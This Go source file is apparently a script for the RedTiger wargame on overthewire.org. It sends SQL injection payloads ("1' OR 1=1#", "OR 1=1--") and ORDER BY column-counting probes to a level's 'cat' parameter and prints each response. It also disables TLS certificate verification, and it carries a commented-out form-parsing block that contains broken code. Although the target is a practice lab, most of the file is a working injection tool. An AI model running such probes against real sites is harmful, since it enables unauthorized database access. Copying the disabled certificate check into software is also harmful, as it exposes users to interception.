package main

import (
	"fmt"
	"net/http"
	"log"
	"io"
	"crypto/tls"
	"net/url"
	"strconv"
)


var baseURL = "https://redtiger.labs.overthewire.org/level1.php"
var sessionCookie = http.Cookie{}

type Input struct {
	itype string
	iname string
}

func Send_Request(method string, endPoint string) *http.Response {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &http.Client{}
	fmt.Println("Sending to ", endPoint)
	req, err := http.NewRequest(method, endPoint, nil)
    if err != nil {
        log.Fatal(err)
    }
    req.AddCookie(&sessionCookie)
	resp, err := client.Do(req)
    if err != nil {
        log.Fatal(err)
    }
	return resp
}


// func Get_Forms(body string) []string {
// 	var allForms []string
// 	for {
// 		if len(body) <= 1 || strings.Index(body, "<form") < 0 {
// 			break
// 		}
// 		startIndex := strings.Index(body, "<form")
// 		endIndex := strings.Index(body, "</form>")
// 		if endIndex > 0 && startIndex >= 0 {
// 			form := body[startIndex:endIndex]
// 			allForms = append(allForms, form)
// 			body = body[endIndex:]
// 		}
// 	}
// 	return allForms
// }

// func Get_Body_Form() []string {
// 	response := Send_Request("GET")
// 	if response.StatusCode == 200 {
// 		rbody, err := io.ReadAll(response.Body)
// 		if err != nil {
// 			fmt.Println("Error:", err)
// 			return nil
// 		}
// 		return Get_Forms(string(rbody))
// 	}
// 	defer response.Body.Close()
// 	return nil
// }

// func Get_Input(forms []string) [][]string {
// 	var inputs [][]string
// 	for _, form := range forms {
// 		var formInputs []string
// 		for {
// 			if len(form) <= 1 || strings.Index(form, "<input") < 0 {
// 				break
// 			}
// 			startIndex := strings.Index(form, "<input")
// 			endIndex := strings.Index(form[startIndex:], ">")
// 			if endIndex > 0 {
// 				endIndex += startIndex + 1
// 				input := form[startIndex:endIndex]
// 				formInputs = append(formInputs, input)
// 				form = form[endIndex:]
// 			}
// 		}
// 		inputs = append(inputs, formInputs)
// 	}
// 	return inputs
// }

// func Parse_Input(input [][]string) {
// 	for _, inputArr := range input {
// 		vars := strings.Split(inputArr, " ")
// 		for _, v := range vars {
// 			if strings.StartsWith(v, "type=") {
// 				itype = strings.Split(v, "type=")
				
// 			}
// 		}
// 	}
// }


// func Inject_Data() {
// 	forms := Get_Body_Form()
// 	fmt.Println(forms)
// 	input := Get_Input(forms)
// 	input = Parse_Input(input)
// }

func OrderBy_Generator() []string {
	var commands []string
	var cmd string
	for i := 1; i <= 100; i++ {
		colNum := strconv.Itoa(i)
		cmd = fmt.Sprintf("1 ORDER BY %s#", colNum)
		commands = append(commands, cmd)
	}
	return commands
}

var optionOrH = "OR 1=1#"
var optionOrD = "OR 1=1--"

func Generate_Commands() []string {
	var commands []string
	commands = append(commands,fmt.Sprintf("1' %s", optionOrH))
	commands = append(commands,fmt.Sprintf("1' %s", optionOrD))
	commands = append(commands,fmt.Sprintf("1 %s", optionOrH))
	commands = append(commands,fmt.Sprintf("1 %s", optionOrD))

	return commands
}

func Execute(cmds []string) {
	
	for _, cmd := range cmds {
		query := url.Values{}
		query.Set("cat", cmd)
		finalURL := fmt.Sprintf("%s?%s", baseURL, query.Encode())
		response := Send_Request("GET", finalURL)
		if response.StatusCode == 200 {
			rbody, err := io.ReadAll(response.Body)
			if err != nil {
				fmt.Println("Error:", err)
			}
			fmt.Println(string(rbody))
		} else {
			fmt.Println(response.StatusCode)
			fmt.Println(response.Body)
		}
	}
}

func Start() {
	cmds := Generate_Commands()
	Execute(cmds)
	cmds = OrderBy_Generator() 
	Execute(cmds)
}


func main() {
	//Inject_Data()
	Start()
}
